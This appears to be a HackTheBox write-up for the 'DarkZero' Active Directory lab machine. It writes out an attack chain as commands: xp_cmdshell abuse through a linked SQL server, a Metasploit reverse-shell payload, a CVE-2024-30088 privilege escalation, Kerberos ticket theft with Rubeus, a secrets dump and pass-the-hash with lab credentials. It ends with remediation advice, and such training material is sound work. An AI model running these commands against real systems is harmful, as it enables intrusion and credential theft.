# HackTheBox - DarkZero Writeup

**Machine:** DarkZero  
**IP Address:** 10.10.11.89  
**Difficulty:** Hard
**OS:** Windows (Active Directory)

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Target Details

- Domain/Hostnames: `darkzero.htb`, `DC01.darkzero.htb`, `dc02.darkzero.ext`
- Starting credentials: `john.w / RFulUtONCOL!`

### Nmap Results

```bash
nmap -p 1-65535 -T4 -A -v 10.10.11.89
```

**Open Ports (DC01):**

- 53/tcp (DNS)
- 88/tcp (Kerberos)
- 135/tcp (MSRPC)
- 139/tcp (NetBIOS)
- 389/tcp (LDAP)
- 445/tcp (SMB)
- 464/tcp (kpasswd)
- 593/tcp (RPC over HTTP)
- 636/tcp (LDAPS)
- 1433/tcp (MSSQL)
- 2179/tcp (vmrdp?)
- 3268/tcp (LDAP GC)
- 3269/tcp (LDAPS GC)
- 5985/tcp (WinRM)
- 9389/tcp (.NET Message Framing)
- High RPC ports: 49664, 49667, 49670, 49671, 49891, 49918, 49967, 65441

### SMB and Host Enumeration

```bash
nxc smb 10.10.11.89 -u 'john.w' -p 'RFulUtONCOL!' --generate-hosts-file /etc/hosts
smbmap -H 10.10.11.89 -d 'darkzero.htb' -u 'john.w' -p 'RFulUtONCOL!'
```

Only default shares were present. SMB and BloodHound enumeration did not provide useful results.

### DNS Enumeration

```bash
dig @DC01.darkzero.htb ANY darkzero.htb
```

**Findings:**

- `darkzero.htb` resolves to `10.10.11.89` and `172.16.20.1`
- Indicates a multihomed host or split-horizon DNS between `10.0.0.0/8` and `172.16.0.0/12`

---

## Initial Access

### MSSQL Access and Linked Servers

Connected to MSSQL using the provided credentials:

```bash
mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!@10.10.11.89' -windows-auth
```

Attempt to enable `xp_cmdshell` on DC01 failed due to insufficient privileges:

```bash
enable_xp_cmdshell
```

Enumerated linked servers:

```bash
enum_links
```

**Linked Servers:**

- `DC01`
- `DC02.darkzero.ext`

The link to `DC02.darkzero.ext` uses `darkzero\john.w` mapped to remote login `dc01_sql_svc`.

Switched to the linked server and enabled `xp_cmdshell` successfully:

```bash
use_link "DC02.darkzero.ext"
enable_xp_cmdshell
```

### Meterpreter via MSSQL

Prepared a payload using Metasploit `web_delivery`:

```bash
msfconsole -q -x "use exploit/multi/script/web_delivery ; set payload windows/x64/meterpreter/reverse_tcp ; set LHOST tun0 ; set LPORT 443 ; set target 2 ; exploit -j"
```

Executed the Base64 payload through `xp_cmdshell`:

```bash
xp_cmdshell "powershell.exe -nop -w hidden -e <base64_payload>"
```

**Result:** Meterpreter session as `darkzero-ext\svc_sql` on `172.16.20.2` (DC02 subnet).

---

## Privilege Escalation - User

### Local Exploit: CVE-2024-30088

Used `local_exploit_suggester` and ran the exploit multiple times until it succeeded:

```bash
use multi/recon/local_exploit_suggester
set session 1
run

use exploit/windows/local/cve_2024_30088_authz_basep
set payload windows/x64/meterpreter_reverse_tcp
set session 1
set lhost tun0
set AutoCheck false
run
```

**Result:** NT AUTHORITY\SYSTEM shell on `172.16.20.2`.

### User Flag (DC02)

```cmd
type C:\Users\Administrator\Desktop\user.txt
```

---

## Privilege Escalation - Root

### Kerberos Ticket Collection with Rubeus

Uploaded and ran Rubeus on DC01 to monitor Kerberos tickets:

```cmd
cd %temp%
C:\Windows\Temp\Rubeus.exe monitor /interval:1 /nowrap
```

Triggered ticket generation from DC01 by calling a UNC path via MSSQL:

```bash
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!'@DC01.darkzero.htb -windows-auth
xp_dirtree \\DC02.darkzero.ext\sfsdafasd
```

Captured ticket output and converted it:

```bash
cat ticket.bs4.kirbi | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi dc01_admin.ccache
export KRB5CCNAME=dc01_admin.ccache
klist
```

Dumped secrets using Kerberos authentication:

```bash
impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
```

### Root Flag (DC01)

Connected via Evil-WinRM with the recovered hash:

```bash
evil-winrm -i 10.10.11.89 -u administrator -H 5917507bdf2ef2c2b0a869a1cba40726
```

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

1. Linked SQL servers can silently grant higher privileges and enable remote command execution.
2. Split-horizon DNS/multihoming can hide services on internal networks and enable lateral movement.
3. `xp_cmdshell` is a high-risk feature that enables OS command execution from SQL Server.
4. Kernel exploits like CVE-2024-30088 can bridge service-level access to SYSTEM.
5. Kerberos ticket monitoring (Rubeus) reveals service tickets and enables pass-the-ticket workflows.

---

## Tools Used

- nmap
- nxc smb
- smbmap
- dig
- mssqlclient.py (Impacket)
- Metasploit (web_delivery, local_exploit_suggester)
- Rubeus
- ticketConverter.py
- impacket-secretsdump
- evil-winrm

---

## Flags

**User Flag:** Retrieved on DC02 (`C:\Users\Administrator\Desktop\user.txt`)  
**Root Flag:** Retrieved on DC01 (`C:\Users\Administrator\Desktop\root.txt`)

---

## Remediation Recommendations

### Critical Severity

1. **Disable or Restrict `xp_cmdshell`**

   - **Issue:** SQL Server allowed OS command execution on a linked server.
   - **Impact:** Remote code execution from database context and lateral movement.
   - **Remediation:**
     - Disable `xp_cmdshell` and use least-privilege SQL roles.
     - Enforce strict separation of linked server credentials.
     - Monitor and alert on any `xp_cmdshell` use.

2. **Harden Linked SQL Server Trusts**

   - **Issue:** Linked server mapping elevated `john.w` to `dc01_sql_svc`.
   - **Impact:** Privilege escalation across SQL hosts.
   - **Remediation:**
     - Remove unnecessary linked servers and explicit credential mappings.
     - Use constrained delegation with least-privilege service accounts.
     - Require multi-factor auth for privileged SQL logins.

### High Severity

3. **Patch Kernel Vulnerabilities (CVE-2024-30088)**

   - **Issue:** Local privilege escalation to SYSTEM.
   - **Impact:** Full system compromise from service access.
   - **Remediation:**
     - Apply the latest Windows security updates.
     - Enforce EDR rules to detect privilege escalation behaviors.

4. **Protect Kerberos Ticket Operations**

   - **Issue:** Ticket issuance and monitoring allowed ticket theft and reuse.
   - **Impact:** Pass-the-ticket attacks and domain compromise.
   - **Remediation:**
     - Enable Kerberos armoring and enforce AES-only tickets.
     - Restrict service accounts and rotate credentials regularly.
     - Monitor for abnormal TGS requests and Rubeus-like behavior.

### Medium Severity

5. **Reduce Service Exposure on Domain Controllers**

   - **Issue:** DC01 exposed MSSQL, WinRM, and multiple RPC endpoints.
   - **Impact:** Increased attack surface for lateral movement.
   - **Remediation:**
     - Remove non-essential services from DCs.
     - Segment management services onto admin-only networks.

6. **Split-Horizon DNS Visibility**

   - **Issue:** Dual IPs and internal-only services complicate monitoring.
   - **Impact:** Hidden interfaces aid lateral movement.
   - **Remediation:**
     - Document multihomed DCs and apply firewall rules per interface.
     - Log and alert on internal-only service access.
